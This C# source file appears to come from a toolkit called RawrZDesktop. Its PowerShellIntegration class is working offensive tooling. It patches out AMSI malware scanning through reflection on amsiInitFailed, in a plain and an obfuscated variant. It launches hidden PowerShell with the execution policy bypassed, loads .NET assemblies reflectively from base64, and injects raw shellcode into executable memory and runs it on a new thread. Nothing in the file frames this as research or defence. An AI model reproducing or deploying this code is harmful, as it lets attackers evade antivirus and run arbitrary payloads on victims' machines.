using System;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace RawrZDesktop.AdvancedModules
{
    public class PowerShellIntegration
    {
        /// <summary>
        /// Executes PowerShell script with AMSI bypass
        /// </summary>
        public static async Task<PowerShellResult> ExecuteScript(string script, bool bypassAmsi = true, bool hidden = true)
        {
            var result = new PowerShellResult();
            
            try
            {
                if (bypassAmsi)
                {
                    script = AddAmsiBypass(script);
                }

                using var process = new Process();
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = $"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{script}\"";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = hidden;
                process.StartInfo.WindowStyle = hidden ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal;
                
                process.Start();
                
                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();
                
                await process.WaitForExitAsync();
                
                result.ExitCode = process.ExitCode;
                result.Output = output;
                result.Error = error;
                result.Success = process.ExitCode == 0;
                
                return result;
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Error = ex.Message;
                return result;
            }
        }

        /// <summary>
        /// Executes PowerShell script from file
        /// </summary>
        public static async Task<PowerShellResult> ExecuteScriptFile(string filePath, bool bypassAmsi = true)
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    return new PowerShellResult { Success = false, Error = "Script file not found" };
                }

                var script = await File.ReadAllTextAsync(filePath);
                return await ExecuteScript(script, bypassAmsi);
            }
            catch (Exception ex)
            {
                return new PowerShellResult { Success = false, Error = ex.Message };
            }
        }

        /// <summary>
        /// Loads .NET assembly into memory and executes
        /// </summary>
        public static async Task<PowerShellResult> LoadAssembly(byte[] assemblyBytes, string methodName = "Main")
        {
            var script = $@"
                $assembly = [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('{Convert.ToBase64String(assemblyBytes)}'))
                $type = $assembly.GetType('Program')
                $method = $type.GetMethod('{methodName}')
                $method.Invoke($null, $null)
            ";
            
            return await ExecuteScript(script, true);
        }

        /// <summary>
        /// Executes shellcode in memory
        /// </summary>
        public static async Task<PowerShellResult> ExecuteShellcode(byte[] shellcode)
        {
            var script = $@"
                $code = @'
                using System;
                using System.Runtime.InteropServices;
                public class ShellcodeRunner {{
                    [DllImport(""kernel32.dll"")]
                    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                    [DllImport(""kernel32.dll"")]
                    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                    [DllImport(""kernel32.dll"")]
                    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
                    public static void Run() {{
                        byte[] shellcode = {{ {string.Join(",", shellcode)} }};
                        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                    }}
                }}
                '@
                Add-Type -TypeDefinition $code
                [ShellcodeRunner]::Run()
            ";
            
            return await ExecuteScript(script, true);
        }

        /// <summary>
        /// Adds AMSI bypass to PowerShell script
        /// </summary>
        private static string AddAmsiBypass(string script)
        {
            var amsiBypass = @"
                $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
                $b = $a.GetField('amsiInitFailed','NonPublic,Static')
                $b.SetValue($null,$true)
            ";
            
            return amsiBypass + Environment.NewLine + script;
        }

        /// <summary>
        /// Executes an encoded PowerShell script
        /// </summary>
        public static async Task<PowerShellResult> ExecuteEncodedScript(string encodedScript, bool bypassAmsi = true, bool hidden = true)
        {
            var decodedScript = System.Text.Encoding.Unicode.GetString(Convert.FromBase64String(encodedScript));
            return await ExecuteScript(decodedScript, bypassAmsi, hidden);
        }

        /// <summary>
        /// Gets AMSI bypass script
        /// </summary>
        public static string GetAmsiBypassScript()
        {
            return @"
                $a = 'System.Management.Automation.A';$b = 'msiUtils';$c = $a+$b;
                $d = [Ref].Assembly.GetType($c);$e = $d.GetField('amsiInitFailed','NonPublic,Static');
                $e.SetValue($null,$true)
            ";
        }

        /// <summary>
        /// Executes script in memory
        /// </summary>
        public static async Task<PowerShellResult> ExecuteInMemory(byte[] scriptBytes, bool bypassAmsi = true)
        {
            var script = System.Text.Encoding.UTF8.GetString(scriptBytes);
            return await ExecuteScript(script, bypassAmsi, true);
        }

        /// <summary>
        /// Executes stealth script with advanced evasion
        /// </summary>
        public static async Task<PowerShellResult> ExecuteStealthScript(string script, bool bypassAmsi = true)
        {
            var stealthScript = $@"
                {GetAmsiBypassScript()}
                {script}
            ";
            return await ExecuteScript(stealthScript, bypassAmsi, true);
        }
    }

    public class PowerShellResult
    {
        public bool Success { get; set; }
        public int ExitCode { get; set; }
        public string Output { get; set; } = "";
        public string Error { get; set; } = "";
    }
}
